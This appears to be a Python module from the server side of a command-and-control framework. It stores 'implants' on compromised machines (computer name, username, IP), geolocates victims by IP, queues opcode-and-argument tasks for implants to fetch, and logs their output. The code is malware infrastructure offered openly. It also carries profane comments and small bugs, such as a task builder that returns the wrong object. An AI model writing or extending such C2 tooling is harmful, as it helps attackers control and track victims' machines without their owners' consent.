# from database import db
from cvnt.tables import *
from cvnt.database import db
from cvnt.implant_pb2 import *
from ip2geotools.databases.noncommercial import DbIpCity# type: ignore
from sqlalchemy.sql.functions import func
# Task Statuses
STATUS_CREATED  = "implant task created"
STATUS_TASK_RECIEVED = "implant pulled down task"
STATUS_TASK_COMPLETE = "implant successfully compeleted task"
STATUS_TASK_FAILED = "implant failed ot complete task"

def make_implant(ri: RegisterImplant, ip) -> RegisterImplant:
    location = get_location(ip)
    i = Implant(
        implant_id = ri.ImplantID,
        computer_name = ri.ComputerName,
        username = ri.Username,
        ip_addr = ip,
        checkin_frq = 1000,
        first_seen = func.now(),
        last_seen = func.now(),
        latitude = location[0],
        longitude = location[1])
    print(i)
    return i

def register_implant(i):
    db.session.add(i)
    db.session.commit()
    return i

def update_implant_last_seen(iID):
    # Query the Implant table by implant_id
    implant = get_implant_by_id(iID)
    # print(f"\n\n\n ---- THIS IS THE IMP:ANT ---- \n\n {implant}\n\n --- END OF IMPLANT ---\n")
    implant.last_seen = func.now()
    db.session.commit()
    return implant

def make_task(target_implantID, tr: TaskRequest): # id, task_id, status, implant_guid, task_opcode, task_args):
    t = Task(
        implant_id = target_implantID,
        task_id = tr.TaskID,
        status = STATUS_CREATED,
        task_opcode = tr.Opcode,
        task_args  = tr.Args
    )
    return t

# returns a list of all implants
def get_list():
    # Query all implants from the Implant table
    all_implants = Implant.query.all()
    # Extract the implant IDs from the list of implants
    implant_ids = [implant.implant_id for implant in all_implants]
    return implant_ids

# gets the longitute and latitude of an implant based on its ip
def get_location(ip):
    res = DbIpCity.get(ip, api_key="free")
    lat = res.latitude
    long = res.longitude
    return [lat, long]

def get_implant_by_id(iID):
    implant = Implant.query.filter_by(implant_id=iID).first()
    return implant

def get_task_by_ids(task_id, implant_id):
    # Query the Implant table by implant_id
    implant = db.session.query(Task).filter_by(task_id=task_id).filter_by(implant_id=implant_id).first()
    return implant

def analyze_TaskResponse(tr: TaskResponse):

    if tr.ByteSize() == 0:
        return False
    
    print(f'[+] TaskReponse:')
    print(f'[+]    * TaskID: {tr.TaskID}')
    print(f'[+]    * ImplantID: {tr.ImplantID}')
    print(f'[+]    * Response: {tr.Response}')
    
    # Query the Implant table by implant_id
    task = get_task_by_ids(tr.TaskID, tr.ImplantID)

    print(f"TASK FOUND: {task}")

    if not tr.HasField("Response"):
        task.status = STATUS_TASK_FAILED
        
    else:
        task.status = STATUS_TASK_COMPLETE
        task.task_output = tr.Response # WING HAS FOREWARNED - THIS WILL FUCK YOU UP. TAKE A DEEP BREATH. AND CAST HOWEVER YOU NEED TO. REGARDLES OF THE CASTING SINS YOU COMMIT
    
    db.session.commit()

    return True


# Send TaskRequest back or "" (if no tasks)
def get_next_task(iID):
   task = db.session.query(Task).filter_by(implant_id=iID).filter_by(status=STATUS_CREATED).order_by(Task.task_id.desc()).first()

   if task is None:
       print("No Task Available")
       return ""
   
   print(f"NEW TASK FOUND: {task}")
   # taskID, opcode, args
   tr = TaskRequest()
   tr.TaskID = task.task_id
   tr.Opcode = task.task_opcode
   tr.Args = task.task_args

   print(tr)
   return task

def make_dummy_task(ip):
    location = get_location(ip)
    i = Implant(
        implant_id = "Blah Blah",
        computer_name = "Ya Ya",
        username = "username",
        ip_addr = ip,
        checkin_frq = 1000,
        latitude = location[0],
        longitude = location[1])

    r = register_implant(i)

